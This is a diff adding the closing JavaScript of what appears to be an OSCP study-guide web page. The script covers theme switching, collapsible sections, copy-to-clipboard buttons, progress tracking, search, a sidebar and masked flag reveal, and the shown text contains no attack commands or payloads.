+<button id="toTop" type="button" aria-label="Back to top">↑</button>
+<div id="toast" role="status" aria-live="polite"></div>
+<script>
+(function(){
+  "use strict";
+  var root=document.documentElement;
+
+  /* ---------- theme ---------- */
+  var THEME_KEY="oscp-theme";
+  function setTheme(t){root.setAttribute("data-theme",t);try{localStorage.setItem(THEME_KEY,t)}catch(e){}}
+  var saved=null;try{saved=localStorage.getItem(THEME_KEY)}catch(e){}
+  if(!saved){saved=window.matchMedia&&window.matchMedia("(prefers-color-scheme: light)").matches?"light":"dark";}
+  setTheme(saved);
+  document.getElementById("themeBtn").addEventListener("click",function(){
+    setTheme(root.getAttribute("data-theme")==="dark"?"light":"dark");
+  });
+
+  /* ---------- wrap h3 sections into collapsible cards ---------- */
+  document.querySelectorAll(".content").forEach(function(content){
+    var kids=Array.prototype.slice.call(content.children);
+    var current=null, sec=null, body=null;
+    kids.forEach(function(el){
+      if(el.tagName==="H3"){
+        sec=document.createElement("section");sec.className="sec";
+        var btn=document.createElement("button");
+        btn.type="button";btn.className="sec-head";btn.setAttribute("aria-expanded","true");
+        btn.textContent=el.textContent;
+        body=document.createElement("div");body.className="sec-body";
+        content.insertBefore(sec,el);
+        sec.appendChild(btn);sec.appendChild(body);
+        el.remove();
+        btn.addEventListener("click",function(){
+          var panel=btn.nextElementSibling;
+          var open=btn.getAttribute("aria-expanded")==="true";
+          btn.setAttribute("aria-expanded",open?"false":"true");
+          if(panel)panel.hidden=open;
+        });
+        current=body;
+      }else if(current){
+        current.appendChild(el);
+      }
+    });
+  });
+
+  /* ---------- copy buttons ---------- */
+  var toast=document.getElementById("toast"),toastTimer=null;
+  function say(msg){
+    toast.textContent=msg;toast.classList.add("show");
+    clearTimeout(toastTimer);toastTimer=setTimeout(function(){toast.classList.remove("show")},1600);
+  }
+  function copy(text,btn){
+    function ok(){if(btn){btn.classList.add("done");var t=btn.textContent;btn.textContent="Copied";
+      setTimeout(function(){btn.classList.remove("done");btn.textContent=t},1400);}say("Copied to clipboard");}
+    if(navigator.clipboard&&navigator.clipboard.writeText){
+      navigator.clipboard.writeText(text).then(ok).catch(function(){fallback(text);ok();});
+    }else{fallback(text);ok();}
+  }
+  function fallback(text){
+    var ta=document.createElement("textarea");ta.value=text;ta.style.position="fixed";ta.style.opacity="0";
+    document.body.appendChild(ta);ta.select();try{document.execCommand("copy")}catch(e){}document.body.removeChild(ta);
+  }
+  document.addEventListener("click",function(e){
+    var btn=e.target.closest(".copy");
+    if(!btn)return;
+    var block=btn.closest(".block"),pre=block&&block.querySelector("pre");
+    if(pre)copy(pre.innerText.replace(/\s+$/,""),btn);
+  });
+
+  /* copy every command in a chapter */
+  document.querySelectorAll(".copyall").forEach(function(btn){
+    btn.addEventListener("click",function(){
+      var ch=btn.closest(".chapter");
+      var cmds=Array.prototype.map.call(ch.querySelectorAll(".block-cmd pre"),function(p){return p.innerText.replace(/\s+$/,"")});
+      if(!cmds.length){say("No commands in this chapter");return;}
+      copy(cmds.join("\n\n"),btn);
+    });
+  });
+
+  /* ---------- progress ---------- */
+  var PKEY="oscp-progress";
+  var checks=Array.prototype.slice.call(document.querySelectorAll(".nav-check"));
+  var done={};try{done=JSON.parse(localStorage.getItem(PKEY)||"{}")}catch(e){}
+  function paint(){
+    var n=0;
+    checks.forEach(function(c){
+      var on=!!done[c.dataset.ch];
+      c.checked=on;
+      c.closest(".nav-item").classList.toggle("done",on);
+      if(on)n++;
+    });
+    var pct=Math.round(n/checks.length*100);
+    document.getElementById("bar").style.width=pct+"%";
+    document.getElementById("pcount").textContent=n+" / "+checks.length;
+    document.getElementById("ppct").textContent=pct+"%";
+  }
+  checks.forEach(function(c){
+    c.addEventListener("click",function(e){e.stopPropagation()});
+    c.addEventListener("change",function(){
+      done[c.dataset.ch]=c.checked;
+      try{localStorage.setItem(PKEY,JSON.stringify(done))}catch(e){}
+      paint();
+    });
+  });
+  paint();
+  document.getElementById("resetProgress").addEventListener("click",function(){
+    done={};try{localStorage.setItem(PKEY,"{}")}catch(e){}paint();say("Progress reset");
+  });
+
+  /* ---------- expand / collapse all ---------- */
+  function setAll(open){
+    document.querySelectorAll(".sec-head").forEach(function(b){
+      b.setAttribute("aria-expanded",open?"true":"false");
+      b.nextElementSibling.hidden=!open;
+    });
+  }
+  document.getElementById("expandAll").addEventListener("click",function(){setAll(true)});
+  document.getElementById("collapseAll").addEventListener("click",function(){setAll(false)});
+
+  /* ---------- scroll spy ---------- */
+  var navItems=Array.prototype.slice.call(document.querySelectorAll(".nav-item"));
+  var chapters=Array.prototype.slice.call(document.querySelectorAll(".chapter"));
+  if("IntersectionObserver" in window){
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(en){
+        if(!en.isIntersecting)return;
+        navItems.forEach(function(n){n.classList.toggle("active",n.dataset.target===en.target.id)});
+      });
+    },{rootMargin:"-70px 0px -70% 0px",threshold:0});
+    chapters.forEach(function(c){io.observe(c)});
+  }
+
+  /* ---------- search ---------- */
+  var input=document.getElementById("search"),count=document.getElementById("searchCount");
+  var index=chapters.map(function(c){
+    return {el:c,item:document.querySelector('.nav-item[data-target="'+c.id+'"]'),
+            text:(c.dataset.title+" "+c.textContent).toLowerCase()};
+  });
+  function clearMarks(){
+    document.querySelectorAll("mark.hit").forEach(function(m){
+      var p=m.parentNode;m.replaceWith(document.createTextNode(m.textContent));p.normalize();
+    });
+  }
+  function run(){
+    var q=input.value.trim().toLowerCase();
+    clearMarks();
+    if(!q){
+      index.forEach(function(r){r.item.style.display="";r.el.style.display=""});
+      count.textContent="";return;
+    }
+    var hits=0,first=null;
+    index.forEach(function(r){
+      var hit=r.text.indexOf(q)!==-1;
+      r.item.style.display=hit?"":"none";
+      r.el.style.display=hit?"":"none";
+      if(hit){hits++;if(!first)first=r;}
+    });
+    count.textContent=hits?hits+" chapter"+(hits>1?"s":""):"no match";
+    if(first&&hits===1){first.el.scrollIntoView({block:"start"});}
+  }
+  var t=null;
+  input.addEventListener("input",function(){clearTimeout(t);t=setTimeout(run,140)});
+  input.addEventListener("keydown",function(e){
+    if(e.key==="Escape"){input.value="";run();input.blur();}
+    if(e.key==="Enter"){var vis=index.filter(function(r){return r.item.style.display!=="none"});if(vis.length){vis[0].el.scrollIntoView({block:"start"})}}
+  });
+
+  /* ---------- keyboard ---------- */
+  document.addEventListener("keydown",function(e){
+    var typing=/^(INPUT|TEXTAREA|SELECT)$/.test(document.activeElement.tagName);
+    if(e.key==="/"&&!typing){e.preventDefault();input.focus();input.select();}
+  });
+
+  /* ---------- mobile sidebar ---------- */
+  var sidebar=document.getElementById("sidebar");
+  document.getElementById("burger").addEventListener("click",function(){sidebar.classList.toggle("open")});
+  navItems.forEach(function(n){n.addEventListener("click",function(){sidebar.classList.remove("open")})});
+
+  /* ---------- flag reveal ---------- */
+  document.querySelectorAll(".flag .reveal").forEach(function(b){
+    b.addEventListener("click",function(){
+      var flag=b.closest(".flag"),v=flag.querySelector(".v");
+      var val=v.dataset.value;
+      var on=flag.classList.toggle("revealed");
+      v.innerHTML=on?'<span>'+val+'</span>':'<span class="masked">••••••••••••••••••••••••••••••••</span>';
+      b.textContent=on?"hide":"reveal";
+    });
+  });
+
+  /* ---------- back to top ---------- */
+  var topBtn=document.getElementById("toTop");
+  window.addEventListener("scroll",function(){
+    topBtn.classList.toggle("show",window.scrollY>600);
+  },{passive:true});
+  topBtn.addEventListener("click",function(){window.scrollTo({top:0,behavior:"smooth"})});
+
+  /* ---------- deep links ---------- */
+  if(location.hash){
+    var target=document.querySelector(location.hash);
+    if(target)setTimeout(function(){target.scrollIntoView({block:"start"})},60);
+  }
+})();
+</script>
+</body>
+</html>
